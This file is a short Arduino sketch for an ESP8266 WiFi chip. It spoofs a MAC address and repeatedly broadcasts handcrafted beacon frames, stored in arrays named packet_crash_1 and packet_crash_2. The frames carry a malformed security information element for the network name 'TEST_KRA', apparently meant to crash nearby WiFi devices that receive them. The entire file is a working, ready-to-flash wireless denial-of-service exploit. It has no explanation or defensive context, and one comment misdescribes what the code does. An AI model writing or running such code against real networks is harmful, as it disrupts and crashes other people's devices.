
extern "C" {
#define USE_US_TIMER 1
#include <user_interface.h>
}

#define CHANNEL_HOP_INTERVAL_MS   250

#define OFFSET_80211 12
#define TYPE_MANAGEMENT       0x00
#define TYPE_CONTROL          0x01
#define TYPE_DATA             0x02
#define SUBTYPE_PROBE_REQUEST 0x04

uint8_t fake_ap_mac[6] = {0x28, 0xc6, 0x3f, 0xa8, 0xaf, 0xc5};
uint8_t packet_crash_1[] = { 128, 0, 0, 0, 255, 255, 255, 255, 255, 255, 40, 198, 63, 168, 175, 197, 40, 198, 63, 168, 175, 197, 0, 0, 169, 219, 53, 0, 0, 0, 0, 0, 100, 0, 17, 0, 0, 8, 84, 69, 83, 84, 95, 75, 82, 65, 1, 8, 130, 132, 139, 150, 12, 18, 24, 36, 3, 1, 9, 48, 20, 1, 0, 0, 15, 172, 2, 1, 0, 0, 15, 172, 2, 56, 116, 0, 15, 172, 1, 8, 237 };
uint8_t packet_crash_2[] = { 128, 0, 0, 0, 255, 255, 255, 255, 255, 255, 40, 198, 63, 168, 175, 197, 40, 198, 63, 168, 175, 197, 0, 0, 200, 42, 0, 2, 0, 0, 0, 0, 100, 0, 17, 0, 0, 8, 84, 69, 83, 84, 95, 75, 82, 65, 1, 8, 130, 132, 139, 150, 12, 18, 24, 36, 3, 1, 9, 48, 18, 1, 0, 0, 15, 172, 2, 62, 180, 55, 57, 1, 0, 0, 15, 172, 0, 0, 0 };



#define DISABLE 0
#define ENABLE  1


void setup() {
  // set the WiFi chip to "promiscuous" mode aka monitor mode
  Serial.begin(115200);
  wifi_set_macaddr(STATION_IF, fake_ap_mac);
  delay(10);
  wifi_set_opmode(STATION_MODE);
  wifi_set_channel(9);
  delay(10);
}

void loop() {

  delay(500);
  wifi_send_pkt_freedom(packet_crash_1, sizeof(packet_crash_1), 1);
  //wifi_send_pkt_freedom(packet_crash_2, sizeof(packet_crash_2), 1);
  Serial.println("Beacon sent");

}
